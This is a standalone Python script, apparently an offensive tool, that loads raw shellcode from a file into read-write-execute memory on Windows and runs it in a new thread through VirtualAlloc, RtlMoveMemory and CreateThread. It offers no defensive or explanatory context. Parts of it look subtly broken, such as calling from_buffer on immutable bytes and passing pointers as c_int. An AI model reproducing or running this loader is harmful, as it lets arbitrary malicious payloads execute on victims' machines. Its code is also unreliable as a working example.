import ctypes
import argparse

MEM_COMMIT = 0x1000
PAGE_EXECUTE_READWRITE = 0x40

def parse_args():
    """
    Function to parse the input arguments.
    """
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", "--input", help="Path to the binary shellcode file", type=argparse.FileType('rb'), required=True)
    return parser.parse_args()

def allocate_and_execute_shellcode(shellcode):
    """
    Function to allocate memory and execute the shellcode.
    """
    ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0), ctypes.c_int(len(shellcode)), ctypes.c_int(MEM_COMMIT), ctypes.c_int(PAGE_EXECUTE_READWRITE))
    buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
    ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr), buf, ctypes.c_int(len(shellcode)))

    ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0), ctypes.c_int(0), ctypes.c_int(ptr), ctypes.c_int(0), ctypes.c_int(0), ctypes.pointer(ctypes.c_int(0)))
    ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht), ctypes.c_int(-1))

def main():
    """
    Main function to run the script.
    """
    try:
        args = parse_args()

        with args.input as f:
            shellcode = f.read()

        if not shellcode:
            raise ValueError("Error: Empty shellcode.")

        allocate_and_execute_shellcode(shellcode)

    except FileNotFoundError as e:
        print(f"Error: File not found. Details: {e}")

    except Exception as e:
        print(f"Error unexpected. Details: {e}")

if __name__ == '__main__':
    main()